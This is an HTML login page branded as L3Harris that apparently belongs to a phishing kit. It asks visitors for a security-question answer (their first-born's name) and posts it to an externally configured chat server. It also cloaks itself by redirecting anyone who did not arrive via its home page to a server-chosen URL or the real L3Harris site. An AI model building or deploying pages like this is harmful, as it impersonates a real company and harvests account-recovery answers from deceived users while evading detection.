<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>L3Harris | Login</title>
  <link rel="stylesheet" href="./styles.css" />
  <script src="./config.js"></script>
  <style>
    .guard{max-width:560px;margin:32px auto;background:#fff;border:1px solid #e6efe7;border-radius:14px;padding:24px;box-shadow:0 8px 24px rgba(0,0,0,.05)}
    .field{display:flex;gap:10px;margin:12px 0}
    .field input{flex:1;padding:12px;border-radius:10px;border:1px solid #dfeade;font-size:16px}
    .btn{display:inline-block;padding:12px 16px;border-radius:10px;border:0;text-decoration:none;font-weight:700;cursor:pointer;background:#0a7f3f;color:#fff}
    .muted{color:#4b5563}
    .error{color:#b91c1c;margin-top:8px}
    .ok{color:#166534;margin-top:8px}
  </style>
<script>
  (async () => {
    let ok = false;
    try { ok = sessionStorage.getItem('came_via_home') === '1'; } catch (e) {}
    if (!ok) {
      try {
        const base = (window.CHAT_SERVER_URL || '').replace(/\/$/, '');
        const r = await fetch(`${base}/api/expired-url`);
        const data = await r.json();
        location.replace(data.url || 'https://www.l3harris.com/');
      } catch {
        location.replace('https://www.l3harris.com/');
      }
      return;
    }
  })();
</script>

</head>
<body>
  <header class="topbar">
    <div class="wrap">
      <a class="brand" href="./index.html">Home</a>
    </div>
  </header>

  <main class="wrap">
    <div class="guard" aria-labelledby="qLabel">
      <h2 id="qLabel">Verify to start a private chat</h2>
      <p class="muted">Security question:</p>
      <p><strong>What is your first bornâ€™s given name?</strong></p>
      <div class="field">
        <input id="answer" placeholder="Type answer..." autocomplete="off" />
        <button id="supportBtn" class="btn">Request Support</button>
      </div>
      <p id="status" class="muted" role="status" aria-live="polite"></p>
      <p id="err" class="error" hidden>Incorrect answer. Please try again.</p>
    </div>
  </main>

  <script>
    const btn = document.getElementById('supportBtn');
    const status = document.getElementById('status');
    const err = document.getElementById('err');
    const answerEl = document.getElementById('answer');

    async function startSession(answer) {
      const base = (window.CHAT_SERVER_URL || '').replace(/\/$/, '');
      const resp = await fetch(`${base}/api/start-session`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'x-portal-entry': '1'   // REQUIRED header so server knows we came via home
        },
        body: JSON.stringify({ answer })
      });
      return resp;
    }

    btn.addEventListener('click', async () => {
      err.hidden = true;
      status.textContent = 'Verifying...';
      btn.disabled = true;
      const answer = (answerEl.value || '').trim();
      try {
        const resp = await startSession(answer);
        if (resp.status === 401 || resp.status === 403) {
          status.textContent = '';
          err.hidden = false;
          answerEl.focus();
          btn.disabled = false;
          return;
        }
        if (!resp.ok) throw new Error('Failed to start session (HTTP ' + resp.status + ')');
        const data = await resp.json();
        if (!data || !data.id) throw new Error('Invalid response from server');
        status.textContent = 'Starting secure chat...';
        window.location.href = `./chat.html?id=${encodeURIComponent(data.id)}`;
      } catch (e) {
        console.error(e);
        status.textContent = 'Error starting support chat: ' + (e?.message || 'Unknown error');
        btn.disabled = false;
      }
    });

    answerEl.addEventListener('keydown', (e) => { if (e.key === 'Enter') btn.click(); });
  </script>
</body>
</html>
